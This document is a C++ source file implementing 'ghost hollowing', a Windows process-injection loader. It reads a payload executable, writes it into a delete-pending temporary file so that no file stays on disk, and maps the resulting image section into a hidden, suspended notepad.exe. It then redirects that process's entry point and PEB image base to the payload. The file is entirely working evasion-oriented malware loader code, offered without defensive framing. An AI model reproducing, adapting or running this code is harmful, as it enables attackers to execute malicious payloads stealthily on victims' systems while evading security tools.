#include <stdio.h>
#include <Windows.h>
#include "ghost.h"
#include <iostream>
using namespace std;


BYTE* GetPayloadBuffer(char* shellcode, OUT size_t& p_size) {
	HANDLE hFile = CreateFileA(shellcode, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	p_size = GetFileSize(hFile, 0);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		printf("[-] ReadFile failed. Error: %d \n", GetLastError());
		exit(-1);
	}
	CloseHandle(hFile);
	return bufferAddress;
}

HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) {
	HANDLE hFile;
	HANDLE hSection;
	NTSTATUS status;
	_OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING uFileName;
	IO_STATUS_BLOCK statusBlock = { 0 };
	DWORD bytesWritten;
	// NT Functions Declaration
	_NtOpenFile NtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	_NtSetInformationFile NtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");

	RtlInitUnicodeString(&uFileName, ntFilePath);
	InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	// Open File
	//		FILE_SUPERSEDED: deletes the old file and creates new one if file exists
	//		FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously

	status = NtOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		&objAttr, &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status)) {
		printf("[-] NtOpenFile failed. Error: %d\n", GetLastError());
		exit(-1);
	}

	// Set disposition flag 
	FILE_DISPOSITION_INFORMATION fi = { 0 };
	fi.DeleteFile = TRUE;
	// Set delete-pending state to the file
	// FileDispositionInformation: Request to delete the file when it is closed
	status = NtSetInformationFile(hFile, &statusBlock, &fi, sizeof(fi), FileDispositionInformation);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}

	// Write Payload To File
	// Since we've set our file to delete-pending state
	// as soon as we close the handle the file will disappear
	if (!WriteFile(hFile, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Failed to write payload to the file...\n");
		exit(-1);
	}


	// Before closing the handle we create a section from delete-pending file
	// This will later become the file-less section 
	// once we close the handle to the delete-pending file
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}

	// Close the delete-pending file handle
	// This will remove the file from the disk
	CloseHandle(hFile);
	hFile = NULL;
	return hSection;
}


HANDLE CreateSuspendedProcess(PROCESS_INFORMATION& pi) {
	if (!load_kernel32_functions()) return NULL;

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFOW);
	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	wchar_t exePath[MAX_PATH];
	lstrcpyW(exePath, L"C:\\Windows\\System32\\notepad.exe");
	// Create Process In Suspended Mode
	HANDLE hToken = NULL;
	HANDLE hNewToken = NULL;
	LPWSTR startDir = NULL;
	if (!CreateProcessInternalW(
		hToken,
		NULL, //lpApplicationName
		exePath, //lpCommandLine
		NULL, //lpProcessAttributes
		NULL, //lpThreadAttributes
		FALSE, //bInheritHandles
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags
		NULL, //lpEnvironment 
		startDir, //lpCurrentDirectory
		&si, //lpStartupInfo
		&pi, //lpProcessInformation
		&hNewToken)) {
		printf("[-] Failed To Create Suspended Process.Error:%d \n", GetLastError());
		exit(-1);
	}
	hTargetProcess = pi.hProcess;
	return hTargetProcess;

}


PVOID MapSectionIntoProcessVA(HANDLE hProcess, HANDLE hSection)
{
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = 0;
	PVOID sectionBaseAddress = 0;
	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");

	// Map the section into target process virtual address space
	status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY);

	printf("[+] Mapped Base: %p \n", sectionBaseAddress);
	return sectionBaseAddress;
}


ULONG_PTR GetPayloadEntryPoint(HANDLE hProcess, PVOID sectionBaseAddress, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION pbi) {
	NTSTATUS status;
	ULONGLONG entryPoint;

	_RtlImageNTHeader RtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");

	printf("[+] Base Address of payload in target process: %p \n", sectionBaseAddress);
	entryPoint = (RtlImageNTHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;

	printf("[+] Image Base Address of the payload buffer in remote process: %p \n", entryPoint);
	entryPoint += (ULONGLONG)sectionBaseAddress;
	printf("[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}

BOOL GhostHollowing(BYTE* payload, DWORD payloadSize) {
	NTSTATUS status;
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");

	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	DWORD returnLength;
	PROCESS_BASIC_INFORMATION pbi;
	ULONG_PTR entryPoint;
	PRTL_USER_PROCESS_PARAMETERS processParameters;

	HANDLE hThread;
	wchar_t ntPath[MAX_PATH] = L"\\??\\";
	wchar_t tempFileName[MAX_PATH] = { 0 };
	wchar_t tempPath[MAX_PATH] = { 0 };
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"PG", 0, tempFileName);
	lstrcatW(ntPath, tempFileName);
	// Make Section With Transacted File
	hSection = MakeSectionFromDeletePendingFile(ntPath, payload, payloadSize);


	// Creating Process In Suspended Mode
	PROCESS_INFORMATION pi = { 0 };
	hProcess = CreateSuspendedProcess(pi);

	// Maping the section into the target process
	PVOID sectionBaseAddress = MapSectionIntoProcessVA(hProcess, hSection);

	//获取挂起进程进程peb，第二个参数设置指定peb，第三个参数是接收peb的缓冲区
	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

	// Getting Payload EntryPoint
	entryPoint = GetPayloadEntryPoint(hProcess, sectionBaseAddress, payload, pbi);

	// 修改OEP
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi.hThread, context)) {
		printf("[-] GetThreadContext failed. Error: %d\n", GetLastError());
		exit(-1);
	}
	// changing entry point to payload entrypoint
	context->Rcx = entryPoint;

	if (!SetThreadContext(pi.hThread, context)) {
		printf("[-] SetThreadContext failed. Error: %d\n", GetLastError());
		exit(-1);
	}

	// Get Remote PEB address
	PEB* remotePEB;
	remotePEB = (PEB*)pbi.PebBaseAddress;
	printf("[+] Remote PEB address: %p \n", remotePEB);

	ULONGLONG imageBaseOffset = sizeof(ULONGLONG) * 2;
	LPVOID remoteImageBase = (LPVOID)((ULONGLONG)remotePEB + imageBaseOffset);
	printf("[+] Address Offset at PEB pointing ImageBaseAddress: %p \n", remoteImageBase);
	SIZE_T written = 0;
	//将shellcode的入口点写入远程进程的peb中
	if (!WriteProcessMemory(pi.hProcess,
		remoteImageBase,
		&sectionBaseAddress,
		sizeof(ULONGLONG),
		&written)) {
		printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
		exit(-1);
	}
	printf("[+] Updated ImageBaseAddress with payload ImageBaseAddress at PEB offset: %p \n", remoteImageBase);

	// Resuming the thread
	ResumeThread(pi.hThread);
	printf("[+] Ghost hollowing successfully. \n");
	return TRUE;
}


int main(int argc, char* argv[]) {
	size_t payloadSize = 0;
	BYTE* payloadBuffer = GetPayloadBuffer(argv[1], payloadSize);
	GhostHollowing(payloadBuffer, payloadSize);
	return 0;
}